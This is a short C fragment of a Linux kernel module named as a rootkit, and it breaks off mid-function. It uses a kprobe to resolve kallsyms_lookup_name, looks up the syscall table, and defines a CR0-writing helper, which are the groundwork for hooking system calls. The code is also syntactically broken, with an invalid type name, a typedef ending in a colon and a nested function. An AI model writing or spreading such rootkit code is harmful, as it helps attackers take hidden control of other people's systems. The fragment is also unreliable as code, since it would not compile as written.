# include <linux/kprobes.h>
#include <asm/special_insns.h>
#include <asm/processor-flags.h>

static int __init rootkit_init(void)
{
    // declare what we need to find
    struct kprobe probe = {
	.symbol_name = "kallsyms_lookup_name"
    };

    if (register_kprobe(&probe)) {
 	pr_err("[-] Failed to get kallsyms_lookup_name() address.");
	return 0;
    }
    
    typedef void *(*kallsyms_t)(const_char *):
    kallsyms_t lookup_name;
    lookup_name = (kallsyms_t)(probe.addr);    
    uint64_t *syscall_table = 0;
    syscall_table = lookup_name("sys_call_table");

    void cr0_write(unsigned long val)
    {
	asm volatile("mov %0, %%cr0"
		     : "+r"(val)
		     :
		     :"memory");
    }
